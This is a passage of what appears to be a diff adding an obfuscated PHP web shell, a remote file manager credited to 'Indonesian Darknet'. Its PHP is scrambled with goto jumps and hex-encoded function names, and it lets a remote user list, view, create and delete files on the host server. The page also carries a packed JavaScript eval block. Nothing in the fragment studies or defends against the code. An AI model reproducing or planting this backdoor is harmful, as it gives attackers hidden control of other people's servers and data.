+<div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?php  goto PX; uo: if ($wL == "view") { goto hs; } goto Nm; Li: echo vT($_GET["n"]); goto zW; Ej: goto L_; goto mi; tK: jr($XR); goto Le; TJ: ?></div><?php  goto lb; RE: isset($_POST["s"]) ? $ek[12]("{$t8}/{$_POST["n"]}") ? Me("file name has been used", 0, "&a=" . Wg("newFile")) : ($ek[13]("{$t8}/{$_POST["n"]}", $_POST["ctn"]) ? Me("file created successfully", 1, "&a=" . wg("view") . "&n=" . wG($_POST["n"])) : me("file failed to create", 0)) : null; goto Uf; qC: goto g6; goto S5; HO: p6: goto V4; YM: b2: goto NH; FU: Jh: goto ZI; f3: if (!($_GET["t"] == "f")) { goto bA; } goto hB; SW: $W9 = "s\x63\x61\x6e\x64\x69r"; goto hN; I6: ?></article><div class="bg-dark border text-center mt-2"><small>Copyright &copy; 2021 - Powered By Indonesian Darknet</small></div><script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script><script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script><script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script><script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script></body></html>
